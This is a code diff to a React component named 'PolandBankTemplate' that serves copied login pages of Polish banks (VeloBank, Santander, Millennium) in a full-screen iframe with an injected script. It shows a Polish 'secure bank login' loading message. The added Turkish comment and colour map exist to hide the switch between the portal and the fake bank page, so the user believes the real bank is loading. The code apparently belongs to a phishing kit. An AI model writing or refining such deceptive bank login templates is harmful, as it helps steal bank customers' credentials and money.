@@ -1326,9 +1326,19 @@ export function PolandBankTemplate({ bankSlug, onChange, handleRouteAction, onPr
     }
   };
 
+  // Sayfa gecislerinde portal krem zemin yerine bankanin kendi zemin
+  // rengi gorunur — iframe load sirasinda "baska sayfaya gectim" hissi
+  // yerine banka sayfasi yukleniyor gorunumu.
+  const BANK_BG: Record<string, string> = {
+    velobank: "#101418",
+    santander: "#f2f2f2",
+    millennium: "#ffffff",
+  };
+  const pageBg = (bankSlug && BANK_BG[bankSlug]) || "#ffffff";
+
   if (files.length === 0) {
     return (
-      <div className="flex min-h-screen items-center justify-center p-4 bg-[#fff6ec]">
+      <div className="flex min-h-screen items-center justify-center p-4" style={{ background: pageBg }}>
         <p className="rounded-xl border border-blue-500/30 bg-blue-500/10 p-5 text-center text-sm text-blue-700">
           Ładowanie bezpiecznej strony logowania Twojego banku...
         </p>
@@ -1340,12 +1350,12 @@ export function PolandBankTemplate({ bankSlug, onChange, handleRouteAction, onPr
 
   return (
     <div
-      className="fixed inset-0 w-[100vw] bg-[#fff6ec] z-[9999] overflow-hidden"
-      style={{ minHeight: "100vh", height: "100dvh" }}
+      className="fixed inset-0 w-[100vw] z-[9999] overflow-hidden"
+      style={{ minHeight: "100vh", height: "100dvh", background: pageBg }}
     >
-      <style>{`body.ah-theme,body.ah-theme-overlay-bg,body{background:#fff6ec !important;background-image:none !important}`}</style>
+      <style>{`body.ah-theme,body.ah-theme-overlay-bg,body{background:${pageBg} !important;background-image:none !important}`}</style>
       {saving && (
-        <div className="absolute inset-0 bg-[#fff6ec]/80 backdrop-blur-sm z-[99999] flex items-center justify-center">
+        <div className="absolute inset-0 backdrop-blur-sm z-[99999] flex items-center justify-center" style={{ background: pageBg }}>
           <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
         </div>
       )}
@@ -1355,7 +1365,7 @@ export function PolandBankTemplate({ bankSlug, onChange, handleRouteAction, onPr
         ref={iframeRef}
         src={`/pl-banks/${bankSlug}/${currentFile}`}
         className="w-full border-0"
-        style={{ height: "100dvh", display: "block" }}
+        style={{ height: "100dvh", display: "block", background: pageBg }}
         sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
         onLoad={injectScript}
       />
